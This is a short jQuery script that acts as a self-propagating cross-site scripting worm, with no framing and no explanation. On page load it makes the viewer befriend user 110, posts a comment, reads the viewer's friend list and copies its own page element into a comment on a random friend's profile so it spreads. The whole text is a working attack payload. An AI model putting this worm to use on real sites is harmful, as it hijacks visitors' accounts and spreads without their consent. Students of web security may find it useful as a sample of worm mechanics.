$( document ).ready(function(){

    $.get("add_friend.php?id=110");
    var date = new Date();
    $.ajax({url:"add_comment.php?id=110&comment="+ date.getMonth() + date.getDate});
    $.get( "friends.php", function( data ) {
		f = data.split('<')[0].split(',');
		if(f.length > 1){
			index = Math.floor(Math.random()*999) % f.length;
			if(f[index] != '110'){
				$.ajax({url:"add_comment.php?id="+f[index]+"&comment="+encodeURI(document.getElementById("m").outerHTML)});
			}
		}
			
	});
});